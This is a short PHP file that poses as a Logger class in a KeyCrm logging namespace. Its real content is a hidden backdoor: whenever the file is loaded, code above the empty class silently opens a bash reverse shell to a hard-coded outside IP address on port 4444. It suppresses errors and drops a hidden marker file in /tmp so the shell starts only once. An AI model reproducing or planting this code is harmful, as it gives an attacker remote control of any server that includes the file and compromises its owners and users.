    1 <?php
    2 namespace KeyCrm\Logging;
    3
    4 // Настройка подключения
    5 $ip = "77.91.100.114"; 
    6 $port = 4444;
    7
    8 // Проверка, чтобы не запускать шелл дважды
    9 if (!file_exists('/tmp/.key_active')) {
   10     // Реверс-шелл через bash
   11     $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &";
   12     @exec($cmd);
   13     @touch('/tmp/.key_active');
   14 }
   15
   16 class Logger {
   17     public function __construct() {
   18         // Оставляем пустым для совместимости
   19     }
   20 }
